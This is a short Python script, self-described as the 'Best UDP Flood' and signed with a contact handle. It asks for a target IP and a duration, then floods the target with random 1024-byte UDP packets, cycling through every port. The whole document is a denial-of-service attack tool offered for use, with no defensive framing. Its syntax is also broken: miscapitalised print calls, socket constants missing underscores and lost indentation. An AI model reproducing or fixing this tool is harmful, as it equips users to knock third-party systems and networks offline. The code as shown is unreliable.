import random
import sys
import os
import socket
import time

Print"Welcome To ZaZeL.py Best UDP Flood"
Print"Contact Me On KiK KnightSec"
os.system("cls")
port = 1
ip = input("\nenter IP: ")
dur = int(input("\nenter Duration:"))
bytes = os.urandom(1024)
socket = socket.socket(socket.AFINET, socket.SOCKDGRAM)
sent = int(0)
timeout = time.time()+dur
while 1 == 1:
try:
if time.time()>timeout:
sys.exit()
else:
socket.sendto(bytes,(ip, port))
sent = sent+1
if port == 65535:
port = 1
else:
port = port+1
print (sent, ip, port)
except KeyboardInterrupt:
sys.exit()